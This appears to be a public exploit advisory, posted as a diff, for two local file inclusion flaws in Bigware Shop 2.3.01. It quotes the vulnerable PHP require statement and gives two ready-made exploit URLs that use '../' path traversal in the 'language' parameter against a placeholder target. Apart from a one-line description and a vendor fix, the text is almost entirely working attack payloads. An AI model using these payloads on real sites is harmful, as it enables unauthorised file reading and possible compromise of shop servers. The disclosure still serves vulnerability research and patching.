@@ -1,0 +1,39 @@
+# Title: Bigware Shop 2.3.01 Multiple Local File Inclusion Vulnerabilities
+# Author: bd0rk
+# eMail: bd0rk[at]hackermail.com
+# Twitter: twitter.com/bd0rk
+# Tested on: Ubuntu-Linux
+# Vendor: http://www.bigware.de
+# Download: http://www.bigware.de/download/bigware_software_-_vollversion/Bigware_Shop.zip
+
+
+Proof-of-Concept1:
+
+/Bigware_Shop/modules/basic_pricing/configmain/main_bigware_12.php source-line 58
+**********************************************************************
+require ( dirname(dirname(__FILE__)).'/language/'.$language.'.php');
+**********************************************************************
+
+[+]Sploit1: http://[target]/Bigware_Shop/modules/basic_pricing/configmain/main_bigware_12.php?language=/../../../../yourFILE.php
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Proof-of-Concept2: 
+
+/Bigware_Shop/modules/basic_pricing/configmain/main_bigware_115.php source-line 56
+*********************************************************************
+require ( dirname(dirname(__FILE__)).'/language/'.$language.'.php');
+********************************************************************* 
+
+[+]Sploit: http://[target]/Bigware_Shop/modules/basic_pricing/configmain/main_bigware_115.php?language=/../../../../yourFILE.php
+
+
+=> Vuln-Description: The $language-parameter isn't declared. So an attacker can readin'.
+=> Vendor-Solution: Please declare this parameter before require. 
+
+
+
+***Greetings fr0m Germany: zone-h.org-Team, exploit-db.com, GoLd_M, Kim Dotcom***
+
+MERRY CHRISTMAS BRO'S! :)
